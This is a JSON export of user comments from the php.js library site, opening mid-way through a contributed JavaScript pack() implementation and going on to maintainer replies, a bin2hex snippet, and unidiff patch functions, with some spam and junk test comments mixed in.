argumentPointer;\n            }\n            if (quantifier > (arguments.length - argumentPointer)) {\n                throw new Error('Warning:  pack() Type ' + instruction +\n                        ': too few arguments');\n            }\n\n            for (i = 0; i < quantifier; i++) {\n                result += String.fromCharCode(arguments[argumentPointer] >>\n                        24 & 0xFF);\n                result += String.fromCharCode(arguments[argumentPointer] >>\n                        16 & 0xFF);\n                result += String.fromCharCode(arguments[argumentPointer] >>\n                        8 & 0xFF);\n                result += String.fromCharCode(arguments[argumentPointer] &\n                        0xFF);\n                argumentPointer++;\n            }\n            break;\n\n        case 'f': \/\/ float (machine dependent size and representation)\n        case 'd': \/\/ double (machine dependent size and representation)\n            \/\/version based on IEEE754\n\n            precisionBits = 23;\n            exponentBits = 8;\n            if (instruction === 'd') {\n                precisionBits = 52;\n                exponentBits = 11;\n            }\n\n            if (quantifier === '*') {\n                quantifier = arguments.length - argumentPointer;\n            }\n            if (quantifier > (arguments.length - argumentPointer)) {\n                throw new Error('Warning:  pack() Type ' + instruction +\n                        ': too few arguments');\n            }\n            for (i = 0; i < quantifier; i++) {\n                argument = arguments[argumentPointer];\n                bias = Math.pow(2, exponentBits - 1) - 1;\n                minExp = -bias + 1;\n                maxExp = bias;\n                minUnnormExp = minExp - precisionBits;\n                status = isNaN(n = parseFloat(argument)) ||\n                        n === -Infinity ||\n                        n === +Infinity ? n : 0;\n                exp = 0;\n                len = 2 * bias + 1 + precisionBits + 3;\n                bin = new Array(len);\n                signal = (n = status !== 0 ? 0 : n) < 0;\n                n = Math.abs(n);\n                intPart = Math.floor(n);\n                floatPart = n - intPart;\n                 \n                for (k = len; k;) {\n                    bin[--k] = 0;\n                }\n                for (k = bias + 2; intPart && k;) {\n                    bin[--k] = intPart % 2;\n                    intPart = Math.floor(intPart \/ 2);\n                }               \n                for (k = bias + 1; floatPart > 0 && k; --floatPart) {\n                    (bin[++k] = ((floatPart *= 2) >= 1) - 0);\n                }\n                for (k = -1; ++k < len && !bin[k];) {}\n                \n                if (bin[(lastBit = precisionBits - 1 +\n                        (k = (exp = bias + 1 - k) >= minExp &&\n                        exp <= maxExp ?\n                            k + 1 :\n                            bias + 1 - (exp = minExp - 1))\n                        ) + 1]) {\n                    if (!(rounded = bin[lastBit])) {\n                        for (j = lastBit + 2;\n                                !rounded &&\n                                j < len; rounded = bin[j++]) {}\n                    }\n                    for (j = lastBit + 1; rounded && --j >= 0;\n                            (bin[j] = !bin[j] - 0) && (rounded = 0)) {}\n                }\n                \n                for (k = k - 2 < 0 ? -1 : k - 3; ++k < len && !bin[k];) {}\n                \n                if ((exp = bias + 1 - k) >= minExp && exp <= maxExp) {\n                    ++k;\n                } else {\n                    if (exp < minExp) {\n                        if (exp !== bias + 1 - len && exp < minUnnormExp) { \n                            \/*\"encodeFloat::float underflow\" *\/\n                        }\n                        k = bias + 1 - (exp = minExp - 1);\n                    }\n                }       \n                \n                if (intPart || status !== 0) {\n                    exp = maxExp + 1;\n                    k = bias + 2;\n                    if (status === -Infinity) {\n                        signal = 1;\n                    } else if (isNaN(status)) {\n                        bin[k] = 1;\n                    }\n                }\n\n                n = Math.abs(exp + bias);\n                tmpResult = \"\";\n                \n                for (j = exponentBits + 1; --j;) {\n                    tmpResult = (n % 2) + tmpResult;\n                    n = n >>= 1;\n                }\n                \n                n = 0;\n                j = 0;\n                k = (tmpResult = (signal ? \"1\" : \"0\") + tmpResult +\n                        bin.slice(k, k + precisionBits).join(\"\")).length;\n                r = [];\n                \n                for (; k;) {\n                    n += (1 << j) * tmpResult.charAt(--k);\n                    if (j === 7) {\n                        r[r.length] = String.fromCharCode(n);\n                        n = 0;\n                    }\n                    j = (j + 1) % 8;\n                }\n                \n                r[r.length] = n ? String.fromCharCode(n) : \"\";\n                result += r.join('');\n                argumentPointer++;\n            }\n            break;\n\n        case 'x': \/\/NUL byte\n            if (quantifier === '*') {\n                throw new Error('Warning: pack(): Type x: \\'*\\' ignored');\n            }\n            for (i = 0; i < quantifier; i ++) {\n                result += String.fromCharCode(0);\n            }\n            break;\n\n        case 'X': \/\/Back up one byte\n            if (quantifier === '*') {\n                throw new Error('Warning: pack(): Type X: \\'*\\' ignored');\n            }\n            for (i = 0; i < quantifier; i ++) {\n                if (result.length === 0) {\n                    throw new Error('Warning: pack(): Type X:' +\n                            ' outside of string');\n                } else {\n                    result = result.substring(0, result.length - 1);\n                }\n            }\n            break;\n\n        case '@': \/\/NUL-fill to absolute position\n            if (quantifier === '*') {\n                throw new Error('Warning: pack(): Type X: \\'*\\' ignored');\n            }\n            if (quantifier > result.length) {\n                extraNullCount = quantifier - result.length;\n                for (i = 0; i < extraNullCount; i ++) {\n                    result += String.fromCharCode(0);\n                }\n            }\n            if (quantifier < result.length) {\n                result = result.substring(0, quantifier);\n            }\n            break;\n\n        default:\n            throw new Error('Warning:  pack() Type ' + instruction +\n                    ': unknown format code');\n        }\n    }\n    if (argumentPointer < arguments.length) {\n        throw new Error('Warning: pack(): ' +\n                (arguments.length - argumentPointer) + ' arguments unused');\n    }\n\n    return result;\n}\n[\/CODE]\n"},{"date":"2009-12-22 03:06:19","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Applied in Git. Thanks very much! (I did a little fixing of the notes and also moved to single quotes as they are equivalent to double quotes in JS and I find they are less ambiguous.) If you have modifications, please use http:\/\/github.com\/kvz\/phpjs\/blob\/master\/functions\/misc\/pack.js as the base... Thanks again!"},{"date":"2010-01-02 08:13:26","author":null,"url":"","comment":"@Tim de Koning: Great job on this function. The only feedback I can give you is that if you were to convert the switch statement with all of its cases to an object of individual functions, similar to the PHP.JS date function (http:\/\/phpjs.org\/functions\/date), the speed of the function will increase, most likely threefold, not that I see the speed of this function to be a problem as is."},{"date":"2011-02-21 18:51:18","author":"Topper Bowers","url":"http:\/\/blog.toppingdesign.com","comment":"Any chance that the reverse (unpack) has already been written?"},{"date":"2011-02-22 04:57:55","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Topper Bowers: At the top of the function list, there is a link to our unported, not implementing, and workbench items, with unpack showing as being the latter. You can follow the link to see whether the code works for you, but most likely it is there because either a bug was found or the function simply hasn't been completed yet. It looks fairly fleshed out though so it might not be too complex to get it working (dunno): https:\/\/github.com\/kvz\/phpjs\/blob\/master\/_workbench\/misc\/unpack.js"},{"date":"2011-09-30 00:45:39","author":"Igor Tykhyy","url":"","comment":"Hi guys! Great function and awesome library. The function works well.. however: for some reason using the php pack method and this php.js pack method doesn't result in the same string.\n\nI've got this SHA1-String (it's the SHA1 code for \"abcdef12\"): d253e3bd69ce1e7ce6074345fd5faa1a3c2e89ef .\nI use \"H*\" to pack this string - and I receive a result. However: according to my page I've got a few symbols in there which are not properly displayed (even on a page that uses utf-8).\nAs for the php pack() method: it returns a bunch of ? along with a few recognizable letters.\n\nWhat I am trying to do is pack this SHA1-String using javascript and then transfer it to my servlet (I used php for testing purposes, I use Java MessageDigest with SHA-algorithm on my backend). But - compared to my servlet - the resulting Strings have slightly different chars (please see my screenshot: http:\/\/www.abload.de\/img\/little_wrong_packtuql.jpg), because it seems that the javascript pack() method creates an ISO-8859-1 string whereas MessageDigest creates an UTF-8 string.\n\nDoes anyone happen to know what I might need to check\/change in order for the awesome javascript pack()-method to produce utf-8 strings? (without the question marks)\n\nThank you all in advance!"},{"date":"2011-11-02 20:15:03","author":"Edward","url":"","comment":"Everything is fine but I've problems in IE7 :S. Using jQuery:\n[CODE]\n$(\".content\").html(pack(\"H*\", hexString));\n[\/CODE]\nThe error message is: 'Undefined' is null or not an object."},{"date":"2012-05-06 09:32:59","author":"????? ?????? ? ?????","url":"http:\/\/an3m1.com\/","comment":"I wonder how you got so good. HaHa ! This is really a fascinating blog, lots of stuff that I can get into. One thing I just want to say is that your design is so perfect ! You certainly know how to get a girls attention ! I\u2019m glad that you\u2019re here. I feel like I\u2019ve learned something new by being here \n"},{"date":"2012-07-05 14:28:28","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Edward: I have made fixes in Git (also for unpack() which is in the workbench). Please check \"raw js source\".\n\n@Igor Tykhyy: I am just trying to give a quick answer now, but it looks like each character is examined in the data, with its Unicode value utilized, whereas in PHP, each byte is treated as a separate character. You might try toying around with the references to \"fromCharCode\" (or \"charCodeAt\" in unpack()) and instead use what I just posted to http:\/\/phpjs.org\/functions\/361:361#comment_179265 for another purpose:\n\n[CODE]\nfunction bin2hex (s) {\n    return encodeURIComponent(s+'').replace(\/%\/g, '').toLowerCase();\n}\n[\/CODE]\n\nThis will convert a non-separated string of hex values for each UTF-8 byte. You may be able to adapt this for your needs."},{"date":"2012-07-05 14:30:51","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Igor Tykhyy: (I should have mentioned that the notes to the function also mention this.)"}],"convert_cyr_string":[{"date":"2010-07-31 17:04:23","author":"emeson felipe","url":"dede_felipesilva@yahoo.com.br","comment":"eu sou o cara"},{"date":"2012-03-22 13:54:05","author":"????? ?????? ? ?????","url":"http:\/\/an3m1.com\/","comment":"News Business Market "}],"inet_ntop":[{"date":"2011-09-16 04:06:58","author":"rimal","url":"football.hou.ru","comment":"what's the fuck?"}],"mail":[{"date":"2010-10-21 20:25:43","author":"a","url":"a","comment":"[code]\nhello\n[\/code]\n"},{"date":"2011-02-09 03:24:33","author":"lh","url":"11111111111","comment":"222222222222"},{"date":"2011-06-02 20:00:49","author":"ffffffffff","url":"fffffffffff","comment":"ffffffffffffffff"},{"date":"2011-11-19 02:08:31","author":"Abro, jQuery Webworker","url":"http:\/\/lucido-media.de\/leistungen\/jquery","comment":"The given host 'research.nihonsoft.org' returns a 'Server not found'. Thats not your fault, but the Google results for \"SSJS SendMail\" aren't that informative and people should know what's going on here. "},{"date":"2012-04-11 15:36:39","author":"??????? ????? ???","url":"http:\/\/an3m1.com\/","comment":"They have done such a great job with this. This is why they are deserving of these awards. Keep up the good work\n "},{"date":"2012-06-16 08:03:42","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Abro, jQuery Webworker: I have updated the code to use archive.org to find the old API. Note that this function will not work client-side, and if it is server-side it requires \"window\" defined as the global (no standard server-side global we can rely on to check). There is also no CommonJS implementation, so this function is probably not very useful now unless you can adapt it for your own SSJS implementation. Again, this is not for client-side code."},{"date":"2012-07-19 11:44:04","author":"kfan","url":"13132","comment":"1311313"}],"xdiff_string_patch":[{"date":"2010-04-11 23:29:50","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Hi,\n\nMy own patching code does not validate. If you want some code that does, the following may work. It is based on code by Imgen Tata, though I have reformatted them to work as self-contained functions in the spirit of php.js (if combined, they could replace xdiff_string_patch):\n\n[CODE]\/*\n * Patches original text to generate new text\n * @author Imgen Tata (http:\/\/www.myipdf.com\/)\n * @see http:\/\/en.wikipedia.org\/wiki\/Diff#Unified_format\n * @param {String} ori_text The original text\n * @param {String} unidiff_patch The patch in unidiff format. will be validated.\n * @returns {String} The generated new text\n * @see Unified diff format on http:\/\/en.wikipedia.org\/wiki\/Diff#Unified_format\n *\/\nfunction string_unidiff_patch (ori_text, unidiff_patch) {\n    var HEADER_PREFIX = '@@ ',\n        HEADER_SUFFIX = ' @@',\n        ORIGINAL_INDICATOR = '-',\n        NEW_INDICATOR = '+',\n        RANGE_SEPARATOR = ',',\n        CONTEXT_INDICATOR = ' ',\n        DELETION_INDICATOR = '-',\n        ADDITION_INDICATOR = '+',\n        ori_lines,\n        patch_lines,\n        patch_line,\n        new_lines = [], NEW_LINE = '\\n',\n        line_index = 0,\n        last_line_index = 0,\n        ori_hunk_start = 0,\n        ori_hunk_size = 0,\n        new_hunk_start = 0,\n        new_hunk_size = 0,\n        context_size = 0,\n        deletion_size = 0,\n        addition_size = 0,\n        i, j,\n        one_or_more_whitespace = '\\\\s*',\n        number_extractor = '(\\\\d+)',\n        \/\/Construct the range extractor regular expression string\n        range_extractor_reg_exp_str = HEADER_PREFIX + one_or_more_whitespace +\n                                      ORIGINAL_INDICATOR + one_or_more_whitespace +\n                                      number_extractor +\n                                      RANGE_SEPARATOR + one_or_more_whitespace +\n                                      number_extractor +\n                                      one_or_more_whitespace +\n                                      '\\\\' + NEW_INDICATOR +\n                                      number_extractor +\n                                      RANGE_SEPARATOR + one_or_more_whitespace +\n                                      number_extractor +\n                                      one_or_more_whitespace +\n                                      HEADER_SUFFIX,\n\n        range_extractor = new RegExp(range_extractor_reg_exp_str),\n        ranges,\n        ori_len,\n        first_char,\n        \/*\n        *Trims string\n        *\/\n        trim = function(text) {\n            if (typeof text != 'string') {\n                throw Error('String parameter required');\n            }\n\n            return text.replace(\/(^\\s*)|(\\s*$)\/g, '');\n        },\n        \/*\n        *Verifies type of arguments\n        *\/\n        verify_type = function(type) {\n            var args = arguments,\n                    args_len = arguments.length,\n                    basic_types = ['number', 'boolean', 'string', 'function', 'object', 'undefined'],\n                    basic_type,\n                    i, j,\n                    type_of_type = typeof type;\n            if (type_of_type != 'string' &&\n                type_of_type != 'function') {\n                throw new Error('Bad type parameter');\n            }\n\n            if (args_len < 2) {\n                throw new Error('Too few arguments');\n            }\n\n            if (type_of_type == 'string') {\n                type = trim(type);\n\n                if (type == '') {\n                    throw new Error('Bad type parameter');\n                }\n\n                for (j = 0; j < basic_types.length; j++) {\n                    basic_type = basic_types[j];\n\n                    if (basic_type == type) {\n                        for (i = 1; i < args_len; i++) {\n                            if (typeof args[i] != type) {\n                                throw new Error('Bad type');\n                            }\n                        }\n\n                        return;\n                    }\n                }\n\n                throw new Error('Bad type parameter');\n            }\n\n            \/\/Not basic type. we need to use instanceof operator\n            for (i = 1; i < args_len; i++) {\n                if (!(args[i] instanceof type)) {\n                    throw new Error('Bad type');\n                }\n            }\n        },\n        \/*\n        *Splits text into lines and return as a string array\n        *\/\n        split_into_lines = function(text) {\n            verify_type('string', text);\n\n            if (text == '') {\n                return [];\n            }\n            return text.split('\\n');\n        },\n        patch_hunk_header_validator = function( context_size,\n                                                ori_hunk_size, delection_size,\n                                                new_hunk_size, addition_size) {\n            if (ori_hunk_size != (context_size + deletion_size) ||\n                       new_hunk_size != (context_size + addition_size)\n                       ) {\n                throw 'invalid patch header';\n            }\n        };\n\n    verify_type('string', ori_text);\n\n    verify_type('string', unidiff_patch);\n\n    ori_lines = split_into_lines(ori_text);\n    ori_len = ori_lines.length;\n    patch_lines = split_into_lines(unidiff_patch);\n    for (i = 0; i < patch_lines.length; i++) {\n        patch_line = patch_lines[i];\n        if (patch_line === '') {\/\/Skip empty line\n            continue;\n        }\n\n        if (patch_line.indexOf(HEADER_PREFIX) != -1) {\/\/A diff hunk header found\n            \/\/validate the previous patch header\n            patch_hunk_header_validator(context_size,\n                            ori_hunk_size, deletion_size,\n                            new_hunk_size, addition_size);\n\n            ranges = patch_line.match(range_extractor);\n            if (ranges === null) {\n                throw 'invalid patch header';\n            }\n\n            ori_hunk_start = ranges[1];\n            ori_hunk_size = ranges[2];\n            new_hunk_start = ranges[3];\n            new_hunk_size = ranges[4];\n\n            last_line_index = line_index;\n            line_index = Math.max( ori_hunk_start - 1, 0);\n\n\n            if(ori_len > 0){\n                \/\/Validate line index\n                if (last_line_index > line_index || line_index > ori_len) {\n                    throw 'invalid patch header';\n                }\n\n                for (j = last_line_index; j < line_index; j++) {\n                    new_lines.push(ori_lines[j]);\n                }\n            }\n\n            \/\/validate new hunk start index\n            if (new_hunk_start > 0 && new_hunk_start != new_lines.length + 1) {\n                throw 'invalid patch header';\n            }\n\n            \/\/Reset sizes\n            context_size = 0;\n            deletion_size = 0;\n            addition_size = 0;\n\n            continue;\n        }\n\n        first_char = patch_line.charAt(0);\n\n        switch (first_char) {\n            case CONTEXT_INDICATOR:\n                new_lines.push(ori_lines[line_index]);\n                line_index++;\n                context_size++;\n                break;\n\n            case DELETION_INDICATOR:\n                line_index++;\n                deletion_size++;\n                break;\n\n            case ADDITION_INDICATOR:\n                new_lines.push(patch_line.substr(1));\n                addition_size++;\n                break;\n\n            default:\n                throw 'Unrecognized initial character in unidiff line';\n        }\n    }\n\n    \/\/Validate the last patch header\n    patch_hunk_header_validator(context_size,\n                            ori_hunk_size, deletion_size,\n                            new_hunk_size, addition_size);\n\n    \/\/Append the remaining lines\n    while (line_index < ori_len) {\n        new_lines.push(ori_lines[line_index]);\n        line_index++;\n    }\n\n    return new_lines.join(NEW_LINE);\n}\n\n\/*\n * Reverse patches original text to generate new text\n * @author Imgen Tata (http:\/\/www.myipdf.com\/)\n * @see http:\/\/en.wikipedia.org\/wiki\/Diff#Unified_format\n * @param {String} new_text The new text\n * @param {String} unidiff_patch The patch in unidiff format. Will be validated.\n * @returns {String} The generated original text\n * @see Unified diff format on http:\/\/en.wikipedia.org\/wiki\/Diff#Unified_format\n *\/\nfunction string_unidiff_reverse_patch (new_text, unidiff_patch) {\n    var HEADER_PREFIX = '@@ ',\n        HEADER_SUFFIX = ' @@',\n        ORIGINAL_INDICATOR = '-',\n        NEW_INDICATOR = '+',\n        RANGE_SEPARATOR = ',',\n        CONTEXT_INDICATOR = ' ',\n        DELETION_INDICATOR = '-',\n        ADDITION_INDICATOR = '+',\n        new_lines, NEW_LINE = '\\n',\n        patch_lines,\n        patch_line,\n        ori_lines = [],\n        line_index = 0,\n        last_line_index = 0,\n        ori_hunk_start = 0,\n        ori_hunk_size = 0,\n        new_hunk_start = 0,\n        new_hunk_size = 0,\n        context_size = 0,\n        deletion_size = 0,\n        addition_size = 0,\n        i, j,\n        one_or_more_whitespace = '\\\\s*',\n        number_extractor = '(\\\\d+)',\n        \/\/Construct the range extractor regular expression string\n        range_extractor_reg_exp_str = HEADER_PREFIX + one_or_more_whitespace +\n                                      ORIGINAL_INDICATOR + one_or_more_whitespace +\n                                      number_extractor +\n                                      RANGE_SEPARATOR + one_or_more_whitespace +\n                                      number_extractor +\n                                      one_or_more_whitespace +\n                                      '\\\\' + NEW_INDICATOR +\n                                      number_extractor +\n                                      RANGE_SEPARATOR + one_or_more_whitespace +\n                                      number_extractor +\n                                      one_or_more_whitespace +\n                                      HEADER_SUFFIX,\n\n        range_extractor = new RegExp(range_extractor_reg_exp_str),\n        ranges,\n        new_len,\n        first_char,\n        \/*\n        *Trims string\n        *\/\n        trim = function(text) {\n            if (typeof text != 'string') {\n                throw Error('String parameter required');\n            }\n\n            return text.replace(\/(^\\s*)|(\\s*$)\/g, '');\n        },\n        \/*\n        *Verifies type of arguments\n        *\/\n        verify_type = function(type) {\n            var args = arguments,\n                    args_len = arguments.length,\n                    basic_types = ['number', 'boolean', 'string', 'function', 'object', 'undefined'],\n                    basic_type,\n                    i, j,\n                    type_of_type = typeof type;\n            if (type_of_type != 'string' &&\n                type_of_type != 'function') {\n                throw new Error('Bad type parameter');\n            }\n\n            if (args_len < 2) {\n                throw new Error('Too few arguments');\n            }\n\n            if (type_of_type == 'string') {\n                type = trim(type);\n\n                if (type == '') {\n                    throw new Error('Bad type parameter');\n                }\n\n                for (j = 0; j < basic_types.length; j++) {\n                    basic_type = basic_types[j];\n\n                    if (basic_type == type) {\n                        for (i = 1; i < args_len; i++) {\n                            if (typeof args[i] != type) {\n                                throw new Error('Bad type');\n                            }\n                        }\n\n                        return;\n                    }\n                }\n\n                throw new Error('Bad type parameter');\n            }\n\n            \/\/Not basic type. we need to use instanceof operator\n            for (i = 1; i < args_len; i++) {\n                if (!(args[i] instanceof type)) {\n                    throw new Error('Bad type');\n                }\n            }\n        },\n        \/*\n        *Splits text into lines and return as a string array\n        *\/\n        split_into_lines = function(text) {\n            verify_type('string', text);\n\n            if (text == '') {\n                return [];\n            }\n            return text.split('\\n');\n        },\n        patch_hunk_header_validator = function( context_size,\n                                                ori_hunk_size, delection_size,\n                                                new_hunk_size, addition_size) {\n            if (ori_hunk_size != (context_size + deletion_size) ||\n                       new_hunk_size != (context_size + addition_size)\n                       ) {\n                throw 'invalid patch header';\n            }\n        };\n\n    verify_type('string', new_text);\n\n    verify_type('string', unidiff_patch);\n\n    new_lines = split_into_lines(new_text);\n    new_len = new_lines.length;\n    patch_lines = split_into_lines(unidiff_patch);\n    for (i = 0; i < patch_lines.length; i++) {\n        patch_line = patch_lines[i];\n        if (patch_line === '') {\/\/Skip empty line\n            continue;\n        }\n\n        if (patch_line.indexOf(HEADER_PREFIX) != -1) {\/\/A diff hunk header found\n            \/\/validate the previous patch header\n            patch_hunk_header_validator(context_size,\n                            ori_hunk_size, deletion_size,\n                            new_hunk_size, addition_size);\n\n            ranges = patch_line.match(range_extractor);\n            if (ranges === null) {\n                throw 'invalid patch header';\n            }\n\n            ori_hunk_start = ranges[1];\n            ori_hunk_size = ranges[2];\n            new_hunk_start = ranges[3];\n            new_hunk_size = ranges[4];\n\n            last_line_index = line_index;\n            line_index = Math.max( new_hunk_start - 1, 0);\n\n\n            if(new_len > 0){\n                \/\/Validate line index\n                if (last_line_index > line_index || line_index > new_len) {\n                    throw 'invalid patch header';\n                }\n\n                for (j = last_line_index; j < line_index; j++) {\n                    ori_lines.push(new_lines[j]);\n                }\n            }\n\n            \/\/validate original hunk start index\n            if (ori_hunk_start > 0 && ori_hunk_start != ori_lines.length + 1) {\n                throw 'invalid patch header';\n            }\n\n            \/\/Reset sizes\n            context_size = 0;\n            deletion_size = 0;\n            addition_size = 0;\n\n            continue;\n        }\n\n        first_char = patch_line.charAt(0);\n\n        switch (first_char) {\n            case CONTEXT_INDICATOR:\n                ori_lines.push(new_lines[line_index]);\n                line_index++;\n                context_size++;\n                break;\n\n            case DELETION_INDICATOR:\n                \/\/Put deleted line back\n                ori_lines.push(patch_line.substr(1));\n                deletion_size++;\n                break;\n\n            case ADDITION_INDICATOR:\n                line_index++;\n                addition_size++;\n                break;\n\n            default:\n                throw 'Unrecognized initial character in unidiff line';\n        }\n    }\n\n    \/\/Validate the last patch header\n    patch_hunk_header_validator(context_size,\n                            ori_hunk_size, deletion_size,\n                            new_hunk_size, addition_size);\n\n    \/\/Append the remaining lines\n    while (line_index < new_len) {\n        ori_lines.push(new_lines[line_index]);\n        line_index++;\n    }\n\n    return ori_lines.join(NEW_LINE);\n}\n[\/CODE]"},{"date":"2010-04-11 23:30:40","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"When I said just now that my own patching does not validate, I didn't mean it is invalid code, but merely that it doesn't do checking of the validity of the diff supplied to it."}],"ob_flush":[{"date":"2012-07-08 09:21:03","author":"samran","url":"www.wellnessdd.com","comment":"wellnessdd"}],"similar_text":[{"date":"2011-01-31 02:52:53","author":"Chris McMacken","url":"","comment":"This function doesn't work in the namespaced version, similar_text() is undefined. Needs to be called as this.similar_text()"},{"date":"2011-01-31 11:09:31","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Chris: Thanks! Fixed in Git..."}]}